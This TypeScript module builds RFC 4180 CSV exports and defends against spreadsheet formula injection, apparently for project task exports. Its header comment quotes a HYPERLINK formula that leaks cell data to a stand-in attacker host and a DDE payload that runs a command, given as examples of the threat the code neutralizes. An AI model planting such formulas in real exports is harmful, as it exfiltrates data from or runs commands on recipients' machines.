/**
 * RFC 4180 CSV serialization with spreadsheet formula-injection hardening.
 *
 * Used by export endpoints to emit per-project task CSVs (columns such as
 * `title, group, assignee_email, due_date, priority, labels, completed, cost`).
 *
 * WHY this module exists (and why its tests matter):
 *
 * 1. Formula injection (CSV injection) is a real exfiltration vector here.
 *    Task titles, group names, and label names are user-controlled. When a
 *    CSV cell begins with `=`, `+`, `-`, or `@`, Excel / Google Sheets /
 *    LibreOffice interpret the cell as a FORMULA, not text — e.g.
 *    `=HYPERLINK("https://evil.example/?leak="&A1,"click")` or legacy DDE
 *    payloads (`=cmd|' /C calc'!A0`) can exfiltrate data or execute commands
 *    on the machine of whoever opens the export. Per OWASP CSV-injection
 *    guidance we neutralize these by prefixing the cell with a single quote
 *    (`'`), which spreadsheet apps render as literal text. We also treat
 *    leading TAB (`\t`) and CR (`\r`) as triggers — OWASP lists both because
 *    Excel strips/ignores them before formula detection, so `\t=1+1` would
 *    otherwise still execute. The prefix is applied BEFORE quoting rules so
 *    the hardened value is what gets escaped.
 *
 * 2. Numbers and booleans are deliberately EXEMPT from injection hardening.
 *    They come from typed sources (D1 numeric/boolean columns), are
 *    stringified via `String()`, and cannot carry a formula payload. This
 *    exemption is load-bearing: a numeric cost of `-5` must export as `-5`
 *    (a number a spreadsheet can sum), never `'-5` (text). Only STRING cells
 *    — the user-controlled ones — are hardened, so a string `"-5"` does
 *    become `'-5`. Tests pin both sides of this boundary.
 *
 * 3. RFC 4180 escaping: fields containing comma, double-quote, CR, or LF are
 *    wrapped in double quotes with embedded quotes doubled (§2.5–2.7), and
 *    records are joined with CRLF (§2.1). Getting this wrong silently
 *    corrupts exports the moment a task title contains a comma or newline.
 *
 * Header-row behavior: headers are encoded through the exact same pipeline
 * as data cells (hardening + quoting). Today headers are developer-constant
 * snake_case names so hardening never fires, but uniform treatment means a
 * future dynamic header (e.g. a user-named custom field column) is safe by
 * default instead of becoming a new injection hole.
 *
 * Output ends with a trailing CRLF. RFC 4180 makes the final line break
 * optional; we emit it so the output is line-complete — safe to stream,
 * concatenate, or append to without producing a malformed last record.
 */

/** A single CSV cell value. `null`/`undefined` serialize to an empty field. */
export type CsvValue = string | number | boolean | null | undefined;

/** Fields containing any of these must be quoted per RFC 4180 §2.6. */
const NEEDS_QUOTING = /[",\r\n]/;

/**
 * Leading characters that make spreadsheet apps treat a cell as a formula.
 * `=` `+` `-` `@` are the classic triggers; `\t` and `\r` are included per
 * OWASP guidance because Excel ignores them before formula detection.
 */
const FORMULA_TRIGGERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * Encode one cell: null/undefined → empty, strings hardened against formula
 * injection, then RFC 4180 quoting applied to the (possibly prefixed) result.
 * The `'` prefix itself never forces quoting — quoting only happens when the
 * field otherwise contains `,` `"` CR or LF.
 */
function encodeField(value: CsvValue): string {
  if (value === null || value === undefined) return "";
  let field: string;
  if (typeof value === "string") {
    // Hardening BEFORE quoting: the prefix becomes part of the field content
    // and is then escaped like any other character.
    field = FORMULA_TRIGGERS.has(value.charAt(0)) ? `'${value}` : value;
  } else {
    // Numbers/booleans stringified plainly; exempt from hardening (see WHY #2).
    field = String(value);
  }
  if (NEEDS_QUOTING.test(field)) {
    return `"${field.replaceAll('"', '""')}"`;
  }
  return field;
}

/**
 * Serialize a header row plus row-objects into an RFC 4180 CSV string.
 *
 * Signature rationale: rows are objects keyed by header (not positional
 * arrays) so the `headers` array is the single source of truth for column
 * order AND value selection — the consuming export endpoint maps each task
 * to a named record once, and reordering/adding columns is a one-place edit
 * with no positional-drift bugs. The `const H` generic infers the header
 * literals at the call site, so TypeScript rejects a row that is missing a
 * column (or that typos a key) at compile time. Headers passed as a plain
 * `string[]` degrade gracefully to `Record<string, CsvValue>` rows.
 *
 * An empty `rows` array yields just the header record (plus trailing CRLF).
 *
 * @param headers Column names, in output order. Encoded with the same
 *   hardening + quoting rules as data cells.
 * @param rows One object per record; each value is looked up by header name.
 *   Missing/null/undefined values serialize to an empty field.
 * @returns CRLF-delimited CSV text ending with a trailing CRLF.
 */
export function toCsv<const H extends readonly string[]>(
  headers: H,
  rows: ReadonlyArray<Record<H[number], CsvValue>>,
): string {
  const lines: string[] = [headers.map(encodeField).join(",")];
  for (const row of rows) {
    // The explicit `H[number]` annotation is required: `headers.map` resolves
    // through `ReadonlyArray<string>`, widening the param to `string`, which
    // cannot index `Record<H[number], CsvValue>`. Every element of `headers`
    // IS `H[number]` by construction, so the annotation is sound, not a cast.
    lines.push(headers.map((header: H[number]) => encodeField(row[header])).join(","));
  }
  return `${lines.join("\r\n")}\r\n`;
}
